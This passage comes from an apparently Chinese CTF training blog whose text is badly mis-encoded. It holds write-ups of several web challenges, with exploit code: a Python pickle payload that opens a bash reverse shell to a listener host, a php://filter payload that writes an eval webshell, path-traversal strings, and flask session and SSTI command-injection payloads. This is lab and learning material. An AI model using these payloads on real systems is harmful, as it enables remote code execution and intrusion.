&#x27;bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1&#x27;&quot;</span>,))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">u = pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(b64encode(u).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>flask-session ä¼ªé€ </code></p>
<p><img src="https://img-blog.csdnimg.cn/6fbbf284a9dd44b5ae70566c1e1609c5.png" alt="img"></p>
<p>æ ¹æ®å½¢å¼å°†ä¸Šé¢expå¾—åˆ°çš„å†…å®¹æ”¾è¿›å»å¹¶åˆ©ç”¨å¯†é’¥è¿›è¡ŒåŠ å¯†</p>
<p><img src="https://img-blog.csdnimg.cn/9ec455b9804040658958df717eda7b64.png" alt="img"></p>
<p>æœ€åæŠ“åŒ…ï¼Œè®¿é—®<code>/admin</code>ä¿®æ”¹sessionï¼Œåœ¨vpsä¸Šè¿›è¡Œç›‘å¬</p>
<p>å°±å¯ä»¥å•¦</p>
<p><img src="https://img-blog.csdnimg.cn/ea28f9e9c0f0436a9fb9f091bde072d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h4><ul>
<li>python pickleåºåˆ—åŒ–</li>
</ul>
<p>ä¸€çœ‹é¢˜ç›®å°±èƒ½çŸ¥é“æ˜¯pythonåºåˆ—åŒ–å’Œååºåˆ—åŒ–äº†ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°sessionï¼Œè¿›è¡Œbase4è§£ç ä¹‹åæ˜¯ä¹±ç ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥è¿›è¡Œååºåˆ—åŒ–</p>
<p><img src="https://img-blog.csdnimg.cn/e1e89602e4394c93b38d79a2b5237715.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"><span class="built_in">print</span>(_pickle.loads(base64.b64decode(<span class="string">&#x27;gAN9cQAoWAUAAABtb25leXEBTZABWAcAAABoaXN0b3J5cQJdcQNYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQRhWBAAAABhbnRpX3RhbXBlcl9obWFjcQVYIAAAADQ2NGZiNTE5ZWNjZDkwMDM3Y2E4MDczMTlkNDU3ODZkcQZ1Lg==&#x27;</span>)))</span><br><span class="line"><span class="comment">#&#123;&#x27;money&#x27;: 400, &#x27;history&#x27;: [&#x27;Yummy smÃ¶rgÃ¥sgurka&#x27;], &#x27;anti_tamper_hmac&#x27;: &#x27;464fb519eccd90037ca807319d45786d&#x27;&#125;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çŒœæµ‹åç«¯å­˜åœ¨base64è§£ç ä¹‹åçš„ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆç›´æ¥ä¸Šexpï¼šï¼ˆä¸Šé¢˜çš„expä»ç„¶é€‚ç”¨ åœ¨linux python2ä¸­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (os.system,(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1&#x27;&quot;</span>,))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">u = pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(b64encode(u).decode())</span><br></pre></td></tr></table></figure>

<p>åœ¨vpsä¸Šç›‘å¬ï¼ŒæŠ“åŒ…</p>
<p><img src="https://img-blog.csdnimg.cn/5cdab4bd0ffa443b870b763111c8d9d2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="WMCTF2020-Web-Check-in-2-0"><a href="#WMCTF2020-Web-Check-in-2-0" class="headerlink" title="[WMCTF2020]Web Check in 2.0"></a>[WMCTF2020]Web Check in 2.0</h4><ul>
<li>php</li>
</ul>
<p><a href="https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md">å‚è€ƒ</a></p>
<p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">@chdir(<span class="variable">$sandbox</span>); </span><br><span class="line">var_dump(<span class="string">&quot;Sandbox:&quot;</span>.<span class="variable">$sandbox</span>); <span class="comment">#å½“å‰è·¯å¾„</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="variable">$content</span>)) <span class="comment"># banäº†phpä¼ªåè®®ç”¨åˆ°çš„ä¸€äº›å…³é”®è¯</span></span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$content</span>)) </span><br><span class="line">        <span class="keyword">require_once</span>(<span class="variable">$content</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å®¡è®¡ä»£ç ä¹‹åå¯ä»¥æƒ³åˆ°åˆ©ç”¨ç‚¹åœ¨äº<code>file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);</code>ï¼Œä¹‹å‰åšè¿‡ç±»ä¼¼çš„ä½¿ç”¨<code>php://filter</code>è¿‡æ»¤å™¨çš„base64ï¼Œç›´æ¥æŠŠå‰é¢çš„exit()ç»•è¿‡ï¼Œä½†æ˜¯è¿™æ¬¡base64è¢«banäº†ï¼Œåªèƒ½åˆ©ç”¨å…¶ä»–è¿‡æ»¤å™¨</p>
<p><a href="https://segmentfault.com/a/1190000018991087#item-2">php://filter</a>åœ¨è¿™é‡Œå¯ä»¥æ‰¾åˆ°å¯åˆ©ç”¨çš„</p>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/c9041e2332f9497fa28888e250d60e10.png" alt="img"></p>
</blockquote>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[&#x27;cmd&#x27;]);?&gt;/resource=a.php</span><br></pre></td></tr></table></figure>

<p>ä¹‹ååˆ©ç”¨å·²çŸ¥çš„è·¯å¾„å»è®¿é—®<code>a.php</code>ï¼Œåˆ©ç”¨shellå¾—åˆ°flag</p>
<h4 id="è“å¸½æ¯-2021-One-Pointer-PHPï¼ˆæœªå­¦å®Œï¼‰"><a href="#è“å¸½æ¯-2021-One-Pointer-PHPï¼ˆæœªå­¦å®Œï¼‰" class="headerlink" title="[è“å¸½æ¯ 2021]One Pointer PHPï¼ˆæœªå­¦å®Œï¼‰"></a>[è“å¸½æ¯ 2021]One Pointer PHPï¼ˆæœªå­¦å®Œï¼‰</h4><p>ç»™äº†æºç ï¼š</p>
<p><code>add_api.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå®¡è®¡ä»£ç ï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬è¦ç»•è¿‡<code>if($count[]=1)</code></p>
<p>è¿™é‡Œåˆ©ç”¨intæº¢å‡ºå°±å¯ä»¥äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// $c=9223372036854775806;</span></span><br><span class="line"><span class="comment">// $count[++$c]=1;</span></span><br><span class="line"><span class="comment">// if($count[]=1)&#123;</span></span><br><span class="line"><span class="comment">//     $c+=1;</span></span><br><span class="line"><span class="comment">//     var_dump($count);</span></span><br><span class="line"><span class="comment">// &#125;else&#123;</span></span><br><span class="line"><span class="comment">//     system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// use User as GlobalUser;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$count</span> = <span class="number">9223372036854775806</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $data  = &#x27;O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A1%3B%7D&#x27;;</span></span><br><span class="line"><span class="comment">// var_dump(unserialize(urldecode($data)));</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> User()));</span><br></pre></td></tr></table></figure>

<p>æŠ“åŒ…ä¿®æ”¹cookieä¹‹åï¼Œgetä¼ <code>backdoor</code>ï¼Œä½†æ˜¯å‘ç°å¥½å¤šå‡½æ•°å’Œç±»éƒ½è¢«banäº†ï¼Œä¹‹åå»å‚è€ƒåˆ«çš„å¸ˆå‚…çš„wpï¼Œä½†æ˜¯å‘ç°å¥½å¤šè¦å­¦ä¹ çš„ç‚¹ï¼ˆ</p>
<p><img src="https://img-blog.csdnimg.cn/9f377ede4e1d4feca2282f2a033ef63c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
]]></content>
      <categories>
        <category>é›†è®­</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buuåˆ·é¢˜</tag>
      </tags>
  </entry>
  <entry>
    <title>é›†è®­ç¬¬äºŒå‘¨å­¦ä¹ </title>
    <url>/2022/01/22/%E9%9B%86%E8%AE%AD%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h4><p>æ‰“å¼€é¶æœºï¼Œæ˜¯ä¸€ä¸ªé­”æ–¹æ¸¸æˆï¼Œçœ‹æºç æœ‰hintè¯´flagåœ¨<code> f1ag_Is_h3re</code>ï¼Œä¸€å¼€å§‹å»jsæ–‡ä»¶é‡Œé¢çœ‹äº†ä¸€ä¸‹ï¼Œæ²¡æœ‰å‘ç°å¹³æ—¶æ¸¸æˆé¢˜ç›®ä¸­å¯ä»¥åˆ©ç”¨çš„ç‚¹</p>
<p><img src="https://img-blog.csdnimg.cn/0aa9f312cdf643f58d774a23c746b609.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>å‘ç°æœ‰ä¸€ä¸ª<code>uploads/favicon.ico </code>ï¼Œç›´æ¥è®¿é—®<code>./uploads/</code>ï¼Œå­˜åœ¨ä¸¤ä¸ªæ–‡ä»¶éƒ½åˆ†åˆ«æŠ“ä¸€ä¸‹åŒ…ï¼Œåœ¨previewé‡Œé¢å‘ç°getä¼ çš„å‚ï¼ŒçŒœæµ‹ä¼šä¸ä¼šå­˜åœ¨æ–‡ä»¶åŒ…å«</p>
<p>è¿™é‡ŒServeræ˜¯<code>openresty</code>ï¼Œç™¾åº¦ä¹‹åå‘ç°æ˜¯åŸºäºnginxï¼Œé‚£ä¹ˆç›´æ¥è¯•ç€çœ‹nginxçš„é…ç½®æ–‡ä»¶å•¥çš„</p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/de73e1269d4744359168e12261db4aa8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>å°è¯•ä¹‹åå‘ç°æœ‰äº›å­—ç¬¦è¢«banæ‰äº†ï¼Œå¯ä»¥è‡ªå·±è¯•ç€èƒ½ä¸èƒ½é€šè¿‡é‡å¤ç­‰ç»•è¿‡ï¼Œç»•è¿‡è¿‡æ»¤ä¹‹åè¿˜è¦è¿›è¡Œç›®å½•ç©¿è¶Š</p>
<p><img src="https://img-blog.csdnimg.cn/c9a2378f738b4ff8991084c09967d7fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>é‚£ä¹ˆï¼Œæƒ³è¦å…¶ä»–æ–‡ä»¶å°±ç›´æ¥åœ¨åé¢æ”¹å§ï¼Œæ ¹æ®æç¤ºç›´æ¥å»<code>f1ag_Is_h3re</code>æ‰¾flag</p>
<p>payload1ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=....//....//....//....//....//....//f1ag_Is_h3rere</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ˜¾ç¤ºè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œçœ‹äº†åˆ«çš„å¸ˆå‚…çš„wp</p>
<p>åœ¨åé¢è¿˜è¦åŠ ä¸Šflagï¼ˆä¸ºä»€ä¹ˆå‘¢ï¼Œè™½ç„¶èƒ½ç†è§£f1ag_Is_h3reå¯èƒ½æ˜¯ä¸ªç›®å½•åï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆèƒ½æƒ³åˆ°å‘¢ï¼Œå¯èƒ½è¿˜æ˜¯ä¸€ç§æ€ç»´å§</p>
<p>æœ€ç»ˆpayloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">....//....//....//....//....//....//f1ag_Is_h3rere//flag</span><br></pre></td></tr></table></figure>

<h4 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h4><ul>
<li>ç»å…¸ä¹°ä¸œè¥¿</li>
<li>sessionä¼ªé€ </li>
<li>/proc/self</li>
<li>/environ</li>
</ul>
<p>é¶æœºä¸»é¡µé¢ï¼Œç»å…¸è¦ç”¨é’±ä¹°flagï¼Œåˆšå¥½å·®ä¸€å—é’±ï¼Œå…ˆéƒ½çœ‹çœ‹å§ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/00bc169409ea4ac0a56d906a37dbd376.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>æŠ“åŒ…ï¼Œå‘ç°åˆæ˜¯sessionä¼ªé€ ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹balanceä¸º1337ï¼Œè¿™æ ·å°±å¯ä»¥è´­ä¹°flagäº†ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“å¯†é’¥å‘€ï¼ï¼</p>
<p>å†æ¬¡å›åˆ°é¦–é¡µï¼Œåº·åº·æºç ï¼ŒæŠ“æŠ“åŒ…</p>
<p>æœ€åç‚¹å‡»å›¾ç‰‡å¯ä»¥ä¸‹è½½ï¼ŒæŠ“åŒ…åº·åº·ï¼›è¿™ç§æ ·å­ä¸ç¦è®©äººè§‰å¾—æœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç”¨<code>/etc/passwd</code>æµ‹è¯•æ˜¯å¦å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p><img src="https://img-blog.csdnimg.cn/fb66bfaf3f5b4dd1aa5ef8c6b73d22ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>ç›®å½•ç©¿è¶Šä¹‹åå®ç°äº†æ–‡ä»¶åŒ…å«</p>
<p><img src="https://img-blog.csdnimg.cn/7bec789db81d4ddcb8cc4b7565765c00.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>çœ‹å¸ˆå‚…çš„<a href="https://blog.csdn.net/weixin_44037296/article/details/111469361">wp</a>ï¼Œå­¦åˆ°çš„æ–°çŸ¥è¯†ï¼š</p>
<p>ï¼ˆå› ä¸ºè¿™é‡Œç”¨åˆ°äº†flask sessionä¼ªé€ ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯pythonçš„ç¯å¢ƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/self æŒ‡å‘å½“å‰çš„è¿›ç¨‹</span><br><span class="line">/environ å½“å‰è¿›ç¨‹çš„å˜é‡ç¯å¢ƒä¿¡æ¯</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/eceb6ce2b2474078bcac2ad4581fab88.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>å¾—åˆ°å¯†é’¥é‚£å°±ç›´æ¥ä¼ªé€ ï¼Œä¿®æ”¹sessionï¼Œè´­ä¹°flagå§</p>
<p><img src="https://img-blog.csdnimg.cn/d494bbde6fab49a2827d5f31b4a235d7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="watevrCTF-2019-Supercalc"><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h4><ul>
<li>flask sessionä¼ªé€ </li>
<li><code>&#123;&#123;config&#125;&#125;</code></li>
</ul>
<p>æ‰“å¼€é¶æœºï¼Œæ˜¯ä¸€ä¸ªè®¡ç®—å™¨</p>
<p><img src="https://img-blog.csdnimg.cn/7fe2d938ac4740dbbf6b73dffa42b5ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>æµ‹è¯•å‡ æ¬¡ä¹‹åï¼ŒæŠ“åŒ…å‘ç°sessionï¼Œkaliä¸­è§£å¯†ä¹‹åå¯ä»¥ç¡®å®šæ˜¯flask sessionï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œä¼ªé€ ï¼Œæ—¢ç„¶å·²ç»çŸ¥é“æ˜¯flaskæ¡†æ¶ï¼Œç„¶åæ‰§è¡Œçš„ä»£ç åˆæ˜¯<code>&#123;&#39;1+1&#39;&#125;</code>è¿™æ ·çš„ï¼Œé‚£ä¹ˆå¯ä»¥çŒœæµ‹æ˜¯sstiæ³¨å…¥</p>
<p>ä½†æ˜¯åŒæ ·çš„ï¼Œé‡ç‚¹è¿˜æ˜¯æ‰¾åˆ°å¯†é’¥</p>
<p>è¿™é‡Œåˆ©ç”¨<code>&#123;&#123;config&#125;&#125;</code>ï¼Œä¸è¿‡è¿™é‡Œå¿…é¡»è¦æ˜¯å†å‰é¢çš„è¿ç®—æŠ¥é”™çš„æƒ…å†µä¸‹æ‰èƒ½å®ç°ï¼Œè¿™æˆ–è®¸å’Œåç«¯çš„checkæœ‰å…³ï¼ˆï¼Ÿå¯ä»¥å»çœ‹ä¸€ä¸‹æºç </p>
<p>åˆ©ç”¨æ³¨é‡Šç»•è¿‡åˆ¤æ–­ï¼Œä½†æ˜¯åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­åˆä¼šæ‰§è¡Œï¼Œå¾—åˆ°å¯†é’¥</p>
<p><img src="https://img-blog.csdnimg.cn/fa93f28b618e4da69963ee06220ff5cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>ä¹‹åç›´æ¥æ‰“payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;history&quot;:[&#123;&quot;code&quot;:&quot;__import__(\&quot;os\&quot;).popen(\&quot;ls\&quot;).read()&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°æœ‰flag.txt</p>
<p><img src="https://img-blog.csdnimg.cn/dd7c034961e74355863ed4d98a377507.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>ç›´æ¥catå°±å¥½å•¦</p>
<p>payload2ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;history&quot;:[&#123;&quot;code&quot;:&quot;__import__(\&quot;os\&quot;).popen(\&quot;cat flag.txt\&quot;).read()&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<h4 id="b01lers2020-Scrambled"><a href="#b01lers2020-Scrambled" class="headerlink" title="[b01lers2020]Scrambled"></a>[b01lers2020]Scrambled</h4><ul>
<li>pythonè„šæœ¬ç¼–å†™</li>
</ul>
<p>ç®€å•æ¥è¯´ï¼Œtransmissionsä¸¤è¾¹çš„<code>kxkxkxkxsh</code>éƒ½ä¸ä¼šæ”¹å˜ï¼Œè€Œä¸­é—´çš„<code>0b29</code>æŒ‡çš„æ˜¯ç¬¬29ä½æ˜¯bï¼Œç¬¬28ä½æ˜¯0ï¼Œç›´æ¥å†™è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://efbfb7c1-8fd8-4ed9-9a4d-0e065c79e0e3.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">res = requests.session()</span><br><span class="line">r = res.get(url, headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;frequency=1; transmissions=kxkxkxkxsh0b29kxkxkxkxsh&#x27;</span>&#125;)</span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">100</span></span><br><span class="line">fflag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>): <span class="comment"># è¿™é‡Œæœ€å¥½æ˜¯è¦100æ­¤ï¼Œéš¾å…ä¼šå‡ºç°é‡å¤çš„transmissionså¯¼è‡´æœ€åçš„ç»“æœé”™è¯¯</span></span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    r = res.get(url)</span><br><span class="line">    cookies = r.cookies</span><br><span class="line">    ans = <span class="built_in">str</span>(cookies[<span class="string">&#x27;transmissions&#x27;</span>])</span><br><span class="line">    ans = ans.replace(<span class="string">&#x27;kxkxkxkxsh&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;%7B&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>).replace(<span class="string">&#x27;%7D&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    index = ans[<span class="number">2</span>:]</span><br><span class="line">    flag[<span class="built_in">int</span>(index)] = ans[<span class="number">1</span>]</span><br><span class="line">    flag[<span class="built_in">int</span>(index)-<span class="number">1</span>] = ans[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-------loading-------&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    fflag += <span class="built_in">str</span>(flag[i])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(fflag)</span><br></pre></td></tr></table></figure>

<h4 id="æœ€åï¼š"><a href="#æœ€åï¼š" class="headerlink" title="æœ€åï¼š"></a>æœ€åï¼š</h4><p>å­¦åˆ°çš„æ–°çŸ¥è¯†ç‚¹ï¼š</p>
<p><strong>0x01:</strong></p>
<p><code>/proc/self</code> æŒ‡å‘å½“å‰è¿›ç¨‹</p>
<p><code>/environ</code> æŒ‡å‘è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ä¿¡æ¯</p>
<p>åšäº†å¥½å¤šflask sessionä¼ªé€ </p>
<p><strong>0x02:</strong></p>
<p>åˆ©ç”¨<code>&#123;&#123;config&#125;&#125;</code>è·å–ç¯å¢ƒå˜é‡</p>
<p>flaskæ¡†æ¶sstiæ³¨å…¥</p>
<p><strong>â€”â€”â€”â€”â€”â€”â€”â€“TBCâ€”â€”â€”â€”â€”â€”â€”â€”â€”</strong></p>
]]></content>
      <categories>
        <category>é›†è®­</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buuåˆ·é¢˜</tag>
      </tags>
  </entry>
  <entry>
    <title>é›†è®­ç¬¬å››å‘¨å­¦ä¹ </title>
    <url>/2022/02/16/%E9%9B%86%E8%AE%AD%E7%AC%AC%E5%9B%9B%E5%91%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h4><ul>
<li>sessionååºåˆ—åŒ–</li>
</ul>
<p>sessionåœ¨phpä¸­çš„å­˜å‚¨æ–¹å¼ä¸ºä¸º <code>é”®å+ç«–çº¿+ç»è¿‡serializeå‡½æ•°åºåˆ—å¤„ç†çš„å€¼</code> ï¼Œè¿™å°±å¯ä»¥ä¼ªé€  <code>admin</code> äº†</p>
<p>expï¼š</p>
